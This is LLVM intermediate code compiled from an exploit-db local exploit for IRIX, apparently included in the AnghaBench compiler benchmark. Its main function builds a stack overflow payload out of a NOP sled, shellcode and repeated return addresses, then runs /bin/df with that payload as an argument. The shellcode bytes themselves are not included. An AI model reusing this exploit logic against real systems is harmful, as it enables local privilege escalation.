; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19274.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/irix/local/extr_19274.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@irix_shellcode = common dso_local global i32* null, align 8
@get_sp_code = common dso_local global i32 0, align 4
@buf = common dso_local global i32* null, align 8
@OFFSET = common dso_local global i32 0, align 4
@BUF_LENGTH = common dso_local global i32 0, align 4
@IRIX_NOP = common dso_local global i32 0, align 4
@EXTRA = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"stack = 0x%x, targ_addr = 0x%x\0A\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"/bin/df\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"df\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"execl failed\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca [1 x i8*], align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32 ()*, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %12 = bitcast [1 x i8*]* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %12, i8 0, i64 8, i1 false)
  %13 = load i32*, i32** @irix_shellcode, align 8
  %14 = bitcast i32* %13 to i8*
  %15 = call i32 @strlen(i8* %14)
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %10, align 4
  %17 = load i32, i32* @get_sp_code, align 4
  %18 = sext i32 %17 to i64
  %19 = inttoptr i64 %18 to i32 ()*
  store i32 ()* %19, i32 ()** %11, align 8
  %20 = load i32 ()*, i32 ()** %11, align 8
  %21 = call i32 %20()
  store i32 %21, i32* %7, align 4
  %22 = load i32*, i32** @buf, align 8
  store i32* %22, i32** %8, align 8
  %23 = load i32, i32* %7, align 4
  %24 = load i32, i32* @OFFSET, align 4
  %25 = add nsw i32 %23, %24
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %3, align 4
  %27 = icmp sgt i32 %26, 1
  br i1 %27, label %28, label %36

28:                                               ; preds = %2
  %29 = load i8**, i8*** %4, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 1
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31)
  %33 = mul nsw i32 %32, 4
  %34 = load i32, i32* %6, align 4
  %35 = add nsw i32 %34, %33
  store i32 %35, i32* %6, align 4
  br label %36

36:                                               ; preds = %28, %2
  br label %37

37:                                               ; preds = %55, %36
  %38 = load i32, i32* %6, align 4
  %39 = and i32 %38, -16777216
  %40 = icmp eq i32 %39, 0
  br i1 %40, label %53, label %41

41:                                               ; preds = %37
  %42 = load i32, i32* %6, align 4
  %43 = and i32 %42, 16711680
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %53, label %45

45:                                               ; preds = %41
  %46 = load i32, i32* %6, align 4
  %47 = and i32 %46, 65280
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %53, label %49

49:                                               ; preds = %45
  %50 = load i32, i32* %6, align 4
  %51 = and i32 %50, 255
  %52 = icmp eq i32 %51, 0
  br label %53

53:                                               ; preds = %49, %45, %41, %37
  %54 = phi i1 [ true, %45 ], [ true, %41 ], [ true, %37 ], [ %52, %49 ]
  br i1 %54, label %55, label %58

55:                                               ; preds = %53
  %56 = load i32, i32* %6, align 4
  %57 = add nsw i32 %56, 4
  store i32 %57, i32* %6, align 4
  br label %37

58:                                               ; preds = %53
  store i32 0, i32* %9, align 4
  br label %59

59:                                               ; preds = %72, %58
  %60 = load i32, i32* %9, align 4
  %61 = sext i32 %60 to i64
  %62 = load i32, i32* @BUF_LENGTH, align 4
  %63 = load i32, i32* %10, align 4
  %64 = sub nsw i32 %62, %63
  %65 = sext i32 %64 to i64
  %66 = udiv i64 %65, 4
  %67 = icmp ult i64 %61, %66
  br i1 %67, label %68, label %75

68:                                               ; preds = %59
  %69 = load i32, i32* @IRIX_NOP, align 4
  %70 = load i32*, i32** %8, align 8
  %71 = getelementptr inbounds i32, i32* %70, i32 1
  store i32* %71, i32** %8, align 8
  store i32 %69, i32* %70, align 4
  br label %72

72:                                               ; preds = %68
  %73 = load i32, i32* %9, align 4
  %74 = add nsw i32 %73, 1
  store i32 %74, i32* %9, align 4
  br label %59

75:                                               ; preds = %59
  store i32 0, i32* %9, align 4
  br label %76

76:                                               ; preds = %91, %75
  %77 = load i32, i32* %9, align 4
  %78 = sext i32 %77 to i64
  %79 = load i32, i32* %10, align 4
  %80 = sext i32 %79 to i64
  %81 = udiv i64 %80, 4
  %82 = icmp ult i64 %78, %81
  br i1 %82, label %83, label %94

83:                                               ; preds = %76
  %84 = load i32*, i32** @irix_shellcode, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i32, i32* %84, i64 %86
  %88 = load i32, i32* %87, align 4
  %89 = load i32*, i32** %8, align 8
  %90 = getelementptr inbounds i32, i32* %89, i32 1
  store i32* %90, i32** %8, align 8
  store i32 %88, i32* %89, align 4
  br label %91

91:                                               ; preds = %83
  %92 = load i32, i32* %9, align 4
  %93 = add nsw i32 %92, 1
  store i32 %93, i32* %9, align 4
  br label %76

94:                                               ; preds = %76
  store i32 0, i32* %9, align 4
  br label %95

95:                                               ; preds = %110, %94
  %96 = load i32, i32* %9, align 4
  %97 = sext i32 %96 to i64
  %98 = load i32, i32* @EXTRA, align 4
  %99 = sext i32 %98 to i64
  %100 = udiv i64 %99, 4
  %101 = icmp ult i64 %97, %100
  br i1 %101, label %102, label %113

102:                                              ; preds = %95
  %103 = load i32, i32* %6, align 4
  %104 = shl i32 %103, 16
  %105 = load i32, i32* %6, align 4
  %106 = ashr i32 %105, 16
  %107 = or i32 %104, %106
  %108 = load i32*, i32** %8, align 8
  %109 = getelementptr inbounds i32, i32* %108, i32 1
  store i32* %109, i32** %8, align 8
  store i32 %107, i32* %108, align 4
  br label %110

110:                                              ; preds = %102
  %111 = load i32, i32* %9, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %9, align 4
  br label %95

113:                                              ; preds = %95
  %114 = load i32*, i32** %8, align 8
  store i32 0, i32* %114, align 4
  %115 = load i32, i32* %7, align 4
  %116 = load i32, i32* %6, align 4
  %117 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0), i32 %115, i32 %116)
  %118 = load i32*, i32** @buf, align 8
  %119 = getelementptr inbounds i32, i32* %118, i64 3
  %120 = getelementptr inbounds [1 x i8*], [1 x i8*]* %5, i64 0, i64 0
  %121 = call i32 @execle(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i32* %119, i32 0, i8** %120)
  %122 = call i32 @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  ret void
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @atoi(i8*) #2

declare dso_local i32 @printf(i8*, i32, i32) #2

declare dso_local i32 @execle(i8*, i8*, i32*, i32, i8**) #2

declare dso_local i32 @perror(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
